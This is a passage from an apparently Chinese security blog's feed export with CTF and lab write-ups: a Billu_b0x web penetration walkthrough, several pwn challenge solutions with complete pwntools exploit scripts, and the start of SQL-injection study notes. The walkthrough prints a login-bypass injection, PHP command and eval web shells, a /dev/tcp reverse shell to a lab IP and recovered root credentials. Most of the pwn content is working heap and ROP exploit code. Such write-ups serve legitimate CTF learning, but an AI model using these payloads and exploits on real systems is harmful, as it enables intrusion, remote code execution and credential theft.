(admin):/var/lib/gnats:/bin/shnobody:x:65534:65534:nobody:/nonexistent:/bin/shlibuuid:x:100:101::/var/lib/libuuid:/bin/shsyslog:x:101:103::/home/syslog:/bin/falsemysql:x:102:105:MySQL Server,,,:/nonexistent:/bin/falsemessagebus:x:103:106::/var/run/dbus:/bin/falsewhoopsie:x:104:107::/nonexistent:/bin/falselandscape:x:105:110::/var/lib/landscape:/bin/falsesshd:x:106:65534::/var/run/sshd:/usr/sbin/nologinica:x:1000:1000:ica,,,:/home/ica:/bin/bash 可以发现拥有root权限的两个账号分别为 root和 ica 利用test 将网站的源代码搞到手，然后开始源码审计 发现在c.php中有数据库的用户名及密码 用户名为 billu ,密码为b0x_billu，所以利用这用户密码登陆数据库 登进去了，然后我就不知道做什么了…..打扰了。尝试用mysql的密码登陆ssh，发现失败了。接着试了下用数据库中的用户名和密码登陆ssh，还是失败了。打扰了，orz 想了下，phpmyadmin的默认配置文件好像会有服务器的密码。于是就将它读取了出来 猜的路径为 /phpmy/config.inc.php 哇哦 ，看得到了什么， 服务器用户 root，密码 为roottoor 再次尝试登陆ssh，一下就登进去了。root权限，相干啥就干啥咯。其实到这里实验就算结束了。但是还有SQL注入没玩，所以我就又去玩了玩。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273 index.php 源码：```php&lt;?php session_start(); include('c.php'); include('head.php'); if(@$_SESSION['logged']!=true) &#123; $_SESSION['logged']=''; &#125; if($_SESSION['logged']==true &amp;&amp; $_SESSION['admin']!='') &#123; echo "you are logged in :)"; header('Location: panel.php', true, 302); &#125; else &#123; echo ' &lt;div align=center style="margin:30px 0px 0px 0px;"&gt; &lt;font size=8 face="comic sans ms"&gt;--==[[ billu b0x ]]==--&lt;/font&gt; &lt;br&gt; &lt;br&gt; Show me your SQLI skills &lt;br&gt; &lt;form =post&gt; Username :- &lt;Input type=text name=un&gt; &amp;nbsp Password:- &lt;input type=password name=ps&gt; &lt;br&gt; &lt;br&gt; &lt;input type=submit name=login value="let\'s login"&gt;'; &#125; if(isset($_POST['login'])) &#123; $uname=str_replace('\'','',urldecode($_POST['un'])); $pass=str_replace('\'','',urldecode($_POST['ps'])); $run='select * from auth where pass=\''.$pass.'\' and uname=\''.$uname.'\''; $result = mysqli_query($conn, $run); if (mysqli_num_rows($result) &gt; 0) &#123; $row = mysqli_fetch_assoc($result); echo "You are allowed &lt;br&gt;"; $_SESSION['logged']=true; $_SESSION['admin']=$row['username']; header('Location: panel.php', true, 302); &#125; else &#123; echo " &lt;script&gt;alert('Try again');&lt;/script&gt;"; &#125; &#125; echo " &lt;font size=5 face=\"comic sans ms\" style=\"left: 0;bottom: 0; position: absolute;margin: 0px 0px 5px;\"&gt;B0X Powered By &lt;font color=#ff9933&gt;Pirates&lt;/font&gt; "; ?&gt;``` 可以发现它的过滤语句 和SQL查询语句。 12345str_replace(&apos;\&apos;&apos;,&apos;&apos;,urldecode($_POST[&apos;un&apos;]));$run=&apos;select * from auth where pass=\&apos;&apos;.$pass.&apos;\&apos; and uname=\&apos;&apos;.$uname.&apos;\&apos;&apos;;str_replace的作用是将字符串&apos; 替换为空，所以构造SQL注入payload时必须在最后加一个&apos;字符利用后台万能密码 &apos; or 1=1 -- \&apos;直接登上去了 进入panel.php页面 发现这里可以上传文件，查看下源代码先 panel.php源代码 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108&lt;?phpsession_start();include('c.php');include('head2.php');if(@$_SESSION['logged']!=true )&#123; header('Location: index.php', true, 302); exit(); &#125; echo "Welcome to billu b0x "; echo ' &lt;form method=post style="margin: 10px 0px 10px 95%;"&gt; &lt;input type=submit name=lg value=Logout&gt; &lt;/form&gt;'; if(isset($_POST['lg'])) &#123; unset($_SESSION['logged']); unset($_SESSION['admin']); header('Location: index.php', true, 302); &#125; echo ' &lt;hr&gt; &lt;br&gt;'; echo ' &lt;form method=post&gt; &lt;select name=load&gt; &lt;option value="show"&gt;Show Users&lt;/option&gt; &lt;option value="add"&gt;Add User&lt;/option&gt; &lt;/select&gt; &amp;nbsp &lt;input type=submit name=continue value="continue"&gt; &lt;/form&gt; &lt;br&gt; &lt;br&gt;'; if(isset($_POST['continue'])) &#123; $dir=getcwd(); $choice=str_replace('./','',$_POST['load']); if($choice==='add') &#123; include($dir.'/'.$choice.'.php'); die(); &#125; if($choice==='show') &#123; include($dir.'/'.$choice.'.php'); die(); &#125; else &#123; include($dir.'/'.$_POST['load']); &#125; &#125; if(isset($_POST['upload'])) &#123; $name=mysqli_real_escape_string($conn,$_POST['name']); $address=mysqli_real_escape_string($conn,$_POST['address']); $id=mysqli_real_escape_string($conn,$_POST['id']); if(!empty($_FILES['image']['name'])) &#123; $iname=mysqli_real_escape_string($conn,$_FILES['image']['name']); $r=pathinfo($_FILES['image']['name'],PATHINFO_EXTENSION); $image=array('jpeg','jpg','gif','png'); if(in_array($r,$image)) &#123; $finfo = @new finfo(FILEINFO_MIME); $filetype = @$finfo-&gt;file($_FILES['image']['tmp_name']); if(preg_match('/image\/jpeg/',$filetype ) || preg_match('/image\/png/',$filetype ) || preg_match('/image\/gif/',$filetype )) &#123; if (move_uploaded_file($_FILES['image']['tmp_name'], 'uploaded_images/'.$_FILES['image']['name'])) &#123; echo "Uploaded successfully "; $update='insert into users(name,address,image,id) values(\''.$name.'\',\''.$address.'\',\''.$iname.'\', \''.$id.'\')'; mysqli_query($conn, $update); &#125; &#125; else &#123; echo " &lt;br&gt;i told you dear, only png,jpg and gif file are allowed"; &#125; &#125; else &#123; echo " &lt;br&gt;only png,jpg and gif file are allowed"; &#125; &#125; &#125; ?&gt; 可以发现，它限制了文件上传的类型，只能上传文件后缀为’jpeg’,’jpg’,’gif’,’png’的文件。并且它存在文件包含漏洞，所以利用上传漏洞和文件包含漏洞就可以往服务器植马 随便找张图片，用记事本打开，将一句话木马加到文件最下面 然后上传到服务器上，但是我好像遇到了点小问题……它死活都不让我上传………我去网上查了下大佬写的攻略，发现就是这么构造的啊…..日常非洲人 昨天我又试了一遍，发现可以了……..真的是打扰了 将图片上传到服务器后，利用panel页面的文件包含漏洞去执行cmd马 &lt;?php system($_GET[‘cmd’]); ?&gt; 测试一下，执行命令 cmd=cat%20/etc/passwd 可以发现命令成功执行了，然后利用反弹shell，向服务器中写入菜刀马 反弹shell命令,注意这个要进行url编码 echo “bash -i &gt;&amp; /dev/tcp/192.168.133.154/4444 0&gt;&amp;1” | bash 获取了反弹shell 写入菜刀马，方便之后传文件，用蚁剑连接 echo ‘&lt;?php eval($_POST[‘zs0zrc’]);?&gt;’ &gt;&gt;1.php 查看系统版本以及内核信息 cat /etc/issue uname -a 然后搜索exp，google搜关键词 Ubuntu 12.04.5 e 第一个就可以用了，将exp上传到服务器上，gcc编译，然后执行，权限就提升到root了 有了root权限后，将/etc/passwd 和 /etc/shadow文件读取出来。然后可以暴力破解root用户密码 这一步我就没有做了]]></content>
      <tags>
        <tag>web</tag>
        <tag>渗透测试</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[2018-高校网络信息安全管理运维挑战赛-pwn-writeup]]></title>
    <url>%2F2018%2F11%2F20%2F2018-11-20-2018-%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E8%BF%90%E7%BB%B4%E6%8C%91%E6%88%98%E8%B5%9B-pwn-writeup%2F</url>
    <content type="text"><![CDATA[挂机pwn手，赛后复现…….各位大佬是真的强 hack防护机制： 1234567☁ HACK checksec hack [*] &apos;/home/zs0zrc/game/gaoxiaoyunwei/HACK/hack&apos; Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x8048000) 程序逻辑 12345678910111213141516171819202122232425262728293031323334int __cdecl main(int argc, const char **argv, const char **envp)&#123; char *v3; // eax char *buf; // ST18_4 _DWORD *v5; // eax _DWORD *v6; // eax _DWORD *v7; // ST24_4 int v8; // ST28_4 int v9; // ST2C_4 prepare(); printf("The address of printf is: %p\n", puts); puts("Suppose there is a struct like: "); puts("struct node &#123;\n\tchar *name;\n\tchar *description;\n\tstruct node *next;\n\tstruct node *prev;\n&#125;;"); puts("And you have a chance to fabricate a fake node struct;\nWhat can you do?"); puts("Besides you can have two chances to leak, input address: "); v3 = malloc(0x14u); buf = v3; v3[read(0, v3, 0xFu) - 1] = 0; v5 = atoll(buf); printf("%d, %p\n", v5, *v5); puts("Second chance: "); buf[read(0, buf, 0xFu) - 1] = 0; v6 = atoll(buf); printf("%d, %p\n", v6, *v6); v7 = malloc(0x14u); printf("The address of the node is %p, and you can input the fake node now: ", v7); read(0, v7, 0x10u); v8 = v7[3]; v9 = v7[2]; *(v8 + 8) = v9; *(v9 + 0xC) = v8; return 0;&#125; 程序先给了两次任意地址泄露的机会，然后再最后实现了一个类似于unlink的操作，导致可以任意地址写。 利用思路： main函数返回时 ，返回地址存放在栈上，通过任意地址写将 main函数的返回地址改写成one_gadget main函数返回时进行的操作以及栈的情况 main函数返回时的stack 123456789101112131415161718192021222324252627pwndbg&gt; stack 2000:0000│ esp 0xffb4aed0 ◂— 0x101:0004│ 0xffb4aed4 ◂— 0x002:0008│ 0xffb4aed8 —▸ 0x9de7008 ◂— '4151692732'03:000c│ 0xffb4aedc ◂— 0xb /* '\x0b' */04:0010│ 0xffb4aee0 —▸ 0xf775cdbc (environ) —▸ 0xffb4afac —▸ 0xffb4c2b5 ◂— 0x515f5451 ('QT_Q')05:0014│ 0xffb4aee4 —▸ 0x9de7020 —▸ 0xf75e3819 (__strtold_nan+137) ◂— jl 0xf75e383f06:0018│ 0xffb4aee8 —▸ 0xffb4aeec —▸ 0x9de7024 —▸ 0xf75e3819 (__strtold_nan+137) ◂— jl 0xf75e383f07:001c│ edx 0xffb4aeec —▸ 0x9de7024 —▸ 0xf75e3819 (__strtold_nan+137) ◂— jl 0xf75e383f08:0020│ 0xffb4aef0 —▸ 0xf775b3dc (__exit_funcs) —▸ 0xf775c1e0 (initial) ◂— 0x009:0024│ 0xffb4aef4 —▸ 0x9de7024 —▸ 0xf75e3819 (__strtold_nan+137) ◂— jl 0xf75e383f0a:0028│ ebp 0xffb4aef8 ◂— 0x00b:002c│ 0xffb4aefc —▸ 0xf75c1637 (__libc_start_main+247) ◂— add esp, 0x100c:0030│ 0xffb4af00 —▸ 0xf775b000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1b1db0... ↓0e:0038│ 0xffb4af08 ◂— 0x00f:003c│ 0xffb4af0c —▸ 0xf75c1637 (__libc_start_main+247) ◂— add esp, 0x1010:0040│ 0xffb4af10 ◂— 0x111:0044│ 0xffb4af14 —▸ 0xffb4afa4 —▸ 0xffb4c2ae ◂— './hack'12:0048│ 0xffb4af18 —▸ 0xffb4afac —▸ 0xffb4c2b5 ◂— 0x515f5451 ('QT_Q')13:004c│ 0xffb4af1c ◂— 0x0泄露出来的stack的地址和ebp的偏移pwndbg&gt; p 0xffb4afac - 0xffb4aef4$1 = 0xb8只要将ebp-4出修改为one_gadget，那么就可以控制程序执行流 exp: 1234567891011121314151617181920212223242526272829303132from pwn import*context.log_level = "debug"p = remote('210.32.4.16','13375')elf = ELF('./hack')libc = ELF('./libc.so')log.info("leak libc address ")puts_got = elf.got["puts"]p.recvuntil("input address: \n")p.sendline(str(puts_got))p.recvuntil(", ")puts = int(p.recv(10),16)libc_base = puts - libc.symbols["puts"]env = libc_base + libc.sym["_environ"]one = libc_base + 0x3a819libc.address = libc_baselog.info("libc_base --&gt; &#123;&#125;".format(hex(libc_base)))p.sendline(str(env))p.recvuntil(", ")stack_addr = int(p.recv(10),16)target = stack_addr - 0xb8log.info(" stack address is &#123;&#125;".format(hex(stack_addr)))p.recvuntil(" is ")node_add = int(p.recvuntil(",").strip(","),16)log.info("node address is &#123;&#125;".format(hex(node_add)))p.recv()payload = p32(one)*2 + p32(node_add + 4)+p32(target-8) p.send(payload)p.interactive() justnote防护机制： 1234567☁ just_note checksec justnote [*] &apos;/home/zs0zrc/game/gaoxiaoyunwei/just_note/justnote&apos; Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: PIE enabled 程序逻辑： 12345678910111213141516171819202122232425262728293031323334353637int __cdecl main(int argc, const char **argv, const char **envp)&#123; __int64 v4; // [rsp+18h] [rbp-8h] prepare(); do &#123; while ( 1 ) &#123; while ( 1 ) &#123; while ( 1 ) &#123; while ( 1 ) &#123; v4 = menu(); if ( v4 &gt; 0 &amp;&amp; v4 &lt;= 4 ) break; puts("invalid choice!"); &#125; if ( v4 != 2 ) break; remove_note(); &#125; if ( v4 &gt; 2 ) break; if ( v4 == 1 ) insert_note(); &#125; if ( v4 != 3 ) break; edit_note(); &#125; &#125; while ( v4 != 4 ); return 0;&#125; 一共有三个功能： insert_note 创建一个新的note edit_note 编辑note remove_note 删除一个note insert_note： 12345678910111213141516171819202122232425262728int insert_note()&#123; __int64 chunk; // [rsp+8h] [rbp-18h] __int64 size; // [rsp+10h] [rbp-10h] signed int i; // [rsp+1Ch] [rbp-4h] for ( i = 0; i &lt;= 31 &amp;&amp; *(16LL * i + table); ++i ) ; if ( i == 32 ) return puts("no more, no more"); chunk = calloc(0x100uLL, 1uLL); if ( !chunk ) &#123; puts("memory error, contact admin"); exit(1); &#125; printf("length of note: ", 1LL); size = read_long_long(); if ( size &lt; 0 ) //漏洞点： 最小的负数取反还是负数，可以造成堆溢出，无限写入 size = -size; if ( size &gt; 0xFF ) size = 255LL; printf("note: "); recvn(chunk, size); *(16LL * i + table) = chunk ^ 0xDEADBEEFCAFEBABELL; *(table + 16LL * i + 8) = size; return printf("check it out: %s\n", chunk);&#125; edit_note: 12345678910111213int edit_note()&#123; __int64 v1; // [rsp+8h] [rbp-8h] printf("index of note: "); v1 = read_long_long(); if ( v1 &lt; 0 || v1 &gt; 31 ) return puts("out of range"); if ( !*(16 * v1 + table) ) return puts("no note here"); printf("note: "); return recvn(*(16 * v1 + table) ^ 0xDEADBEEFCAFEBABELL, *(16 * v1 + table + 8));&#125; delete_note: 123456789101112131415161718192021222324252627int remove_note()&#123; signed __int64 v0; // rax __int64 v2; // [rsp+8h] [rbp-8h] printf("index of note: "); v2 = read_long_long(); if ( v2 &gt;= 0 &amp;&amp; v2 &lt;= 31 ) &#123; if ( *(16 * v2 + table) ) &#123; free((*(16 * v2 + table) ^ 0xDEADBEEFCAFEBABELL)); *(16 * v2 + table) = 0LL; v0 = 16 * v2 + table; *(v0 + 8) = 0LL; &#125; else &#123; LODWORD(v0) = puts("no note here"); &#125; &#125; else &#123; LODWORD(v0) = puts("out of range"); &#125; return v0;&#125; 解题思路： 利用堆溢出，先泄露出堆地址，然后泄露libc地址 后面的做法就是house_of_orange了 伪造_IO_FILE结构体，利用unsorted bin attack,修改 _IO_list_all为 main_arena + 0x58 最后调用malloc函数，触发 _malloc_printerr ，最终getshell 要注意的是 ，因为它分配堆的空间用的函数是calloc函数，它默认是会初始化堆块，将空间内容清空，但是如果是mmap分配的chunk空间的话，就不会清空。所以想泄露信息的话就要将chunk的 IS_MMAPED标志位覆盖为1 伪造的fake_file 12345678910fake_file = '/bin/sh'.ljust(8, '\x00') + p64(0x61)fake_file +=p64(0) + p64(io_list_all_addr - 0x10) #unsorted bin attackfake_file += p64(0) #_IO_write_basefake_file += p64(1) #_IO_write_ptr bypass check fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)fake_file += p64(0) * 9 fake_file += p64(system_addr) fake_file =fake_file.ljust(0xc0,'\x00') fak_file += p64(0xffffffffffffffff) #bypass fp-&gt;_mode &lt;= 0fake_file += p64(0) * 2 fake_file += p64(fake_file_addr + 0x60) #vtable 伪造的vtable表 最终exp： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485#!/usr/bin/env pythonfrom pwn import *local = 1if local: p = process('./justnote') elf = ELF('./justnote') libc = elf.libcelse: p = remote("210.32.4.17","13376") elf = ELF('./justnote') libc = ELF('./libc.so')context.arch = elf.archcontext.log_level='debug'def add(lgth, note): p.recvuntil('choice: ') p.sendline('1') p.recvuntil('note: ') p.sendline(str(lgth)) p.recvuntil('note: ') p.sendline(note)def delete(idx): p.recvuntil('choice: ') p.sendline('2') p.recvuntil('note: ') p.sendline(str(idx))def edit(idx, note): p.recvuntil('choice: ') p.sendline('3') p.recvuntil('note: ') p.sendline(str(idx)) p.recvuntil('note: ') p.sendline(note) def HouseOfOrange(fake_file_addr, system_addr, io_list_all_addr): fake_file = '/bin/sh'.ljust(8, '\x00') + p64(0x61) fake_file +=p64(0) + p64(io_list_all_addr - 0x10) #unsorted bin attack fake_file += p64(0) #_IO_write_base fake_file += p64(1) #_IO_write_ptr bypass check fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base) fake_file += p64(0) * 9 fake_file += p64(system_addr) fake_file =fake_file.ljust(0xc0,'\x00') fake_file += p64(0xffffffffffffffff) #bypass fp-&gt;_mode &lt;= 0 fake_file += p64(0) * 2 fake_file += p64(fake_file_addr + 0x60) #vtable return fake_file add(-9223372036854775808,'a'*8) #0add(100,'b'*8) #1add(-9223372036854775808,'c'*8) #2add(100,'d'*8) #3add(-9223372036854775808,'e'*8) #4add(100,'d'*8) #5add(100,'d'*8) #6delete(1)delete(3)pause()edit(0,'\x00'*0x108 + '\x13')add(100,'a'*8)p.recvuntil("a"*8)heap_addr = u64(p.recv(6).ljust(8,'\x00'))heap_base = heap_addr - 0x540log.info("heap address is &#123;&#125;".format(hex(heap_addr)))edit(2,'\x00'*0x108 + '\x13')add(100,'a'*8)p.recvuntil("a"*8)libc_base = u64(p.recv(6).ljust(8,'\x00')) - libc.symbols['__malloc_hook'] - 0x10 - 0x58log.info("libc address is &#123;&#125;".format(hex(libc_base)))libc.address = libc_basedelete(5)edit(4, '\x00' * 0x100 + HouseOfOrange(heap_addr + 0x110 * 2, libc.sym['system'], libc.sym['_IO_list_all']))p.recvuntil('choice: ')p.sendline('1')p.interactive() reference: 高校运维赛 2018 Writeup – 天枢]]></content>
      <categories>
        <category>CTF&#39;s writeup</category>
      </categories>
      <tags>
        <tag>writeup</tag>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[SUCTF 招新赛 2018 writeup]]></title>
    <url>%2F2018%2F11%2F19%2F2018-11-19-SUCTF-%E6%8B%9B%E6%96%B0%E8%B5%9B-2018-writeup%2F</url>
    <content type="text"><![CDATA[前段时间做了下SUCTF的招新赛的pwn题，题目还是很友好的，适合新手。但是一直没有写writeup，现在有时间就把writeup写了。 basic-pwn简单的栈溢出 直接上exp: 12345from pwn import*p = process('pwn')payload = 'a'*280 + p64(0x4005c7)p.sendline(payload)p.interactive() stack也是简单栈溢出，和basic-pwn差不多 exp: 123456from pwn import*p=process("./pwn")payload='a'*0x28+p64(0x400676)p.recvuntil("============================\n")p.sendline(payload)p.interactive() babyarray数组下标溢出，将特定变量覆盖为0就可以了。 输入 的下标为-14，值为0 。 unlink一道简单的unlink题。改写__free_hook为system函数，再free掉一个包含“/bin/sh”字符串的chunk，就可以getshell exp: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263#!/usr/bin/env pythonfrom pwn import *local = 0if local: p = process('./unlink') elf = ELF('./unlink') libc = elf.libcelse: p = remote("43.254.3.203",10005) elf = ELF('./unlink') libc = ELF('./libc-2.23.so')context.arch = elf.archcontext.log_level='debug'def touch(size): p.sendlineafter("please chooice :\n","1") p.sendlineafter("size : \n",str(size))def delete(idx): p.sendlineafter("please chooice :\n","2") p.sendlineafter(" delete\n",str(idx)) def show(idx): p.sendlineafter("please chooice :\n","3") p.sendlineafter("show\n",str(idx)) def take(idx,content): p.sendlineafter("please chooice :\n","4") p.sendlineafter("modify :\n",str(idx)) p.sendlineafter("content\n",content) ptr = 0x06020C0fake_chunk = p64(0) + p64(0x90) + p64(ptr - 0x18) + p64(ptr - 0x10) fake_chunk = fake_chunk.ljust(0x90,'a')fake_chunk += p64(0x90) + p64(0x90)touch(0x90)touch(0x80) touch(0x20)delete(0)touch(0x90)show(0)p.recvuntil("the content is : \n")leak = u64(p.recv(6).ljust(8,'\x00'))log.info(hex(leak))libc_base = leak - libc.symbols['__malloc_hook'] - 0x10 - 0x58 libc.address = libc_baselog.info(hex(libc_base))take(0,fake_chunk)delete(1)payload = 'a'*0x18 + p64(libc.symbols['__free_hook'])take(2,"/bin/sh")take(0,payload)take(0,p64(libc.symbols['system'])*2)delete(2)p.interactive() ez_heap网鼎杯半决赛的原题，就改了下字符串。漏洞点是一个UAF。 利用方法，先利用unsorted bin将libc地址泄露出来，然后利用UAF漏洞来进行fastbins_dup 分配到包含__malloc_hook的chunk，改写 _malloc_hook为one_gadget，最后通过doublefreee触发 _malloc_printerr 来getshell。 详情可以看我之前网鼎杯的writeup地址 exp 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990#!/usr/bin/env pythonfrom pwn import *local = 0if local: p = process('./ez_heap') elf = ELF('./ez_heap') libc = elf.libcelse: host = '43.254.3.203' port = '10006' p = remote(host,port) elf = ELF('./ez_heap') libc = ELF('./libc-2.23.so')context.arch = elf.arch#context.terminal = ['tmux', 'splitw', '-h']context.log_level='debug'def sd(content): p.send(content)def sl(content): p.sendline(content)def rc(): return p.recv()def ru(content): return p.recvuntil(content)def create(size,name,t): ru('Your choice : ') sl('1') ru('Length of the name :') sl(str(size)) ru('The name of animal :') sd(name) ru('The kind of the animal :') sl(t)def view(): ru('Your choice : ') sl('2')def delete(idx): ru('Your choice : ') sl('3') rc() sl(str(idx))def clean(): ru('Your choice : ') sl('4')create(0x98,'a'*8,'1234')create(0x68,'bbbb','456798')create(0x68,'bbbb','456798')create(0x28,'bbbb','456798')delete(0)clean()create(0x98,'a'*8,'1234')view()ru('a'*8)leak = u64(p.recv(6).ljust(8,'\x00'))main_arena = leak - 0x58log.info(hex(main_arena))pause()libc_base = main_arena - libc.symbols['__malloc_hook'] - 0x10 log.info("libc_base is &#123;&#125;".format(hex(libc_base)))malloc_hook = libc_base + libc.symbols['__malloc_hook']system = libc_base + libc.symbols['system']one_gadget = 0xf02a4 + libc_basedelete(1)delete(2)delete(1)create(0x68,p64(malloc_hook - 0x23),'1234')create(0x68,'bbbb','456798')create(0x68,'bbbb','456798')create(0x68,'a'*0x13 + p64(one_gadget),'1234')delete(0)delete(0)p.interactive() easy_overflow_file_structureIO_FILE利用的简化版 漏洞点: 解析请求头字段的循环退出不当，导致可以写入多次，导致溢出，可以覆盖掉文件流指针 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748__int64 __fastcall lookForHeader(const char *strings, __int64 input, signed int size, _BYTE *target, unsigned int count)&#123; _BYTE *v5; // rax _BYTE *v6; // rdx __int64 result; // rax _BYTE *v8; // [rsp+0h] [rbp-40h] unsigned int v9; // [rsp+8h] [rbp-38h] signed int v10; // [rsp+Ch] [rbp-34h] unsigned int n; // [rsp+2Ch] [rbp-14h] size_t n_4; // [rsp+30h] [rbp-10h] unsigned int j; // [rsp+38h] [rbp-8h] signed int i; // [rsp+3Ch] [rbp-4h] v10 = size; v8 = target; v9 = count; n = strlen(strings); for ( i = 0; ; ++i ) &#123; result = v10 - n; if ( (signed int)result &lt;= i ) break; if ( !strncmp((const char *)(input + i), strings, n) &amp;&amp; *(_BYTE *)(i + n + input) == 58 ) &#123; for ( i += n + 1; i &lt; v10 &amp;&amp; (*(_BYTE *)(i + input) == 32 || *(_BYTE *)(i + input) == 9); ++i ) ; for ( j = i; j &lt; v10; ++j ) &#123; if ( *(_BYTE *)(j + input) == 35 ) &#123; if ( j - i + 1 &lt;= v9 ) &#123; n_4 = i + input; while ( n_4 &lt; (unsigned __int64)j + input ) &#123; v5 = v8++; v6 = (_BYTE *)n_4++; *v5 = *v6; &#125; *v8 = 0; &#125; break; &#125; &#125; &#125; &#125; return result;&#125; exp: 12345678910111213141516from pwn import*context.log_level = "debug"#p = process('./eofs')p = remote('43.254.3.203',"10002")payload = "GET / HTTP/1.1#"payload +=" Host:"+"a"*126 + "#"payload += " ResearchField:"+ 'a'*126 +"#"payload +=" ResearchField:"+ 'a'*2 + p64(0x6021a0) +"#"payload += " Username: " + p64(0xdeadbeef)*4 + "#"p.sendline(payload.ljust(8000,'b'))p.recv()p.interactive() int程序的逻辑很简单，存在一个整数溢出。通过整数溢出可以造成栈溢出，就可以进行rop了。 这里我一开始比较困惑的是那个alloca函数，它通过ida反编译后参数很奇怪，我还以为进行了什么操作。直到我自己写了个测试alloca函数的程序，发现原来这个函数不在glibc库中，它由一些汇编语句构成，最终结果是将栈的空间增大，并返回一个内存指针。 测试程序： 12345678910#include&lt;stdio.h&gt;#include&lt;stdlib.h&gt;int main()&#123; int *a; a = alloca(16); return 0;&#125; 拖进ida中看下 123456789101112131415161718.text:000000000040054E ; 4: v3 = alloca(32LL);.text:000000000040054E mov rax, fs:28h.text:0000000000400557 mov [rbp+var_8], rax.text:000000000040055B xor eax, eax.text:000000000040055D mov eax, 10h.text:0000000000400562 sub rax, 1.text:0000000000400566 add rax, 1Fh.text:000000000040056A mov esi, 10h.text:000000000040056F mov edx, 0.text:0000000000400574 div rsi.text:0000000000400577 imul rax, 10h.text:000000000040057B sub rsp, rax.text:000000000040057E mov rax, rsp.text:0000000000400581 add rax, 0Fh.text:0000000000400585 shr rax, 4.text:0000000000400589 shl rax, 4.text:000000000040058D mov [rbp+var_10], rax.text:0000000000400591 mov eax, 0 对比题目的代码 123456789101112131415.text:000000000040076D ; 13: v3 = alloca(32LL);.text:000000000040076D mov eax, 10h.text:0000000000400772 sub rax, 1.text:0000000000400776 add rax, 1Bh.text:000000000040077A mov ecx, 10h.text:000000000040077F mov edx, 0.text:0000000000400784 div rcx.text:0000000000400787 imul rax, 10h.text:000000000040078B sub rsp, rax.text:000000000040078E mov rax, rsp.text:0000000000400791 add rax, 0Fh.text:0000000000400795 shr rax, 4.text:0000000000400799 ; 14: buf = (16 * ((&amp;v6 + 3) &gt;&gt; 4));.text:0000000000400799 shl rax, 4.text:000000000040079D mov [rbp+buf], rax 可以发现其实 v3 = alloca(32LL); 和buf = (16 * ((&amp;v6 + 3) &gt;&gt; 4));这两条反编译后的语句相当于 buf = alloca(32); 程序的漏洞点 它后面read函数读入数据的大小和alloca函数分配的大小是由我们输入控制的，所以可以控制它为一个很大的值，造成整数溢出，那么可以分配一个小空间，但是可以读取很多数据。那么就会造成栈溢出。 栈的大小要通过调试来得到，dest的地址为0x7ffd035211b0 dest与rbp的距离 所以dest + 12 距离返回地址的偏移为 0x80-12 + 8 = 124 栈的大小知道了，剩下的就是怎么进行rop利用。先泄露出libc地址，然后调用system函数来getshell。 exp: 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253#!/usr/bin/env pythonfrom pwn import *p = process('./int')elf = ELF('./int')libc = elf.libccontext.arch = elf.archcontext.log_level='debug'def sd(content): p.send(content)def sl(content): p.sendline(content)def rc(): return p.recv()def ru(content): return p.recvuntil(content) rc()#gdb.attach(p,"b *0x0400824")pop_rdi = 0x00000000004008f3payload = p32(0x6e696b53) + p32(0x1) + p32(0xffffffff) p.send(payload)payload = 'a'*124payload += p64(pop_rdi)payload += p64(elf.got['puts'])payload += p64(elf.plt['puts'])payload += p64(0x4005E0)# startp.send(payload)leak = u64(p.recv(6).ljust(8, "\x00"))libc.address = leak - libc.symbols['puts']info("libc.address: &#123;&#125;".format(hex(libc.address)))payload = p32(0x6E696B53) + p32(1) + p32(0xffffffff)sd(payload)payload = 'a'*124payload += p64(pop_rdi)payload += p64(libc.search("/bin/sh\x00").next())payload += p64(libc.symbols['system'])payload += p64(0xdeadbeef)sd(payload)p.interactive()]]></content>
      <categories>
        <category>CTF&#39;s writeup</category>
      </categories>
      <tags>
        <tag>writeup</tag>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[SQL注入学习]]></title>
    <url>%2F2018%2F11%2F14%2F2018-11-14-SQL%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0%2F</url>
    <content type="text"><![CDATA[SQL学习笔记 SQL基础注释语句单行注释： 以“#”号开头,直到该行行尾,全部都是注释内容 以“– ”号开头,直到该行行尾,全部都是注释内容。（“– ”与注释内容之间要加有空格） 多行注释： /……/，“/”用于注释文字的开头，“/”用于注释文字的结尾。 常用函数 user()：当前数据库用户 database()：当前数据库名 version()：当前使用的数据库版本 @@datadir：数据库存储数据路径 concat()：联合数据，用于联合两条数据结果。如 concat(username,0x3a,password) group_concat()：和 concat() 类似，如 group_concat(DISTINCT+user,0x3a,password)，用于把多条数据一次注入出来 concat_ws()：用法类似 hex() 和 unhex()：用于 hex 编码解码 load_file()：以文本方式读取文件，在 Windows 中，路径设置为 \\ select xxoo into outfile &#39;路径&#39;：权限较高时可直接写文件 MYSQL常规注入步骤12345678爆数据库名select schema_name from information_schema.schemata爆表名select table_name from information_schema.tables where table_schema=&apos;&apos;爆列名select column_name from information_schema.columns where table_name=&apos;&apos;爆出某列的内容Select xxx from xxx sqli-labs一个练习SQL注入的靶场 writeupLess-1payload 123456789101112131415尝试id=1&apos;报错，尝试id=1&apos; and 1=1 %23 不报错 %23是#字符说明这个是个单引号闭合最终payload为http://localhost/sqli/Less-1/?id=1’ and 1=1 %23练习下MYSQL的常规注入操作爆破字段数http://localhost/sqli/Less-1/?id=1’ order by 4 %23爆数据库名http://localhost/sqli/Less-1/?id=1’union select 1,group_concat(schema_name),3 from 